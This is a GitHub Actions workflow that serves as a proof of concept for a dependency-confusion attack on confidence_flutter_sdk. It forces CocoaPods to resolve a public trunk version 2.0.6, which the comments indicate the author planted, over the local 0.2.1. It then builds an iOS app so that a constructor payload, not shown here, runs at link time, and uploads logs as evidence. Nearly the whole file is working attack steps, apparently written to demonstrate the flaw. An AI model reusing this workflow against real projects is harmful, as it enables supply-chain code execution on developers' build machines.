name: Supply Chain RCE Proof of Concept (Race Condition)
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Race Condition Hijack (Trunk Forced)
        run: |
          # 1. INITIALIZATION: Simulasi Fresh Machine
          rm -rf rce_test
          flutter create rce_test
          cd rce_test
          
          # 2. OFFICIAL INTEGRATION STEP
          echo "=== Adding SDK via Official Instructions ==="
          flutter pub add confidence_flutter_sdk:0.2.1
          
          cd ios
          # Standar fix build
          sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile
          
          # 3. THE HIJACK (FORCING GLOBAL REGISTRY)
          echo "=== Initalizing and Forcing Trunk CDN ==="
          # Daftarin Trunk secara manual karena Runner seringkali 'kosong'
          pod repo add-cdn trunk https://cdn.cocoapods.org/ || true
          
          # Force update metadata untuk mendeteksi v2.0.6 lu di publik
          pod repo update trunk
          
          echo "=== Triggering Dependency Confusion ==="
          # Tanpa Podfile.lock, CocoaPods akan membandingkan Trunk (2.0.6) vs Local (0.2.1).
          # Secara sistemik, SemVer v2.0.6 akan menang.
          pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
          
          echo "=== Verify Shadowing Success ==="
          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "Hijack Failed: Still using local"
          
          cd ..
          # 4. EXECUTION PHASE
          echo "=== Launching Build to Trigger Payload ==="
          # Payload __attribute__((constructor)) akan tereksekusi saat linking
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Final Audit Log (Search for Payload Execution) ==="
          grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"

      - name: Upload PoC Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rce-evidence-race-v2.1
          path: |
            rce_test/ios/pod_update.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
